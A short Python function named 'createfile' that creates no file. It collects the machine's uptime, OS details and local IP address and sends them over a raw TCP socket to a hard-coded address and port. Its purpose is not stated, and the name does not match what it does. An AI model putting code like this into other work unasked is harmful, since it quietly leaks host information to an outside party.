def createfile():
    import platform
    from datetime import datetime
    import socket

    with open("/proc/uptime", "r") as f:
        uptime = f.read().split(" ")[0].strip()

    uptime = int(float(uptime))
    uptime_hours = uptime // 3600
    uptime_minutes = (uptime % 3600) // 60
    uptime = "Uptime : " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours"
    systeminfo = (
        "OS:",
        platform.release(),
        "SysName:",
        platform.system(),
        "OSVersion:",
        platform.version(),
        "Platform:",
        platform.platform(),
        "IPDetails:",
        socket.gethostbyname(socket.gethostname()),
    )
    sendable_string = f"{uptime} --- {systeminfo}"
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect(("11.1.11.1", 9090))
    clientSocket.send(str(sendable_string).encode())
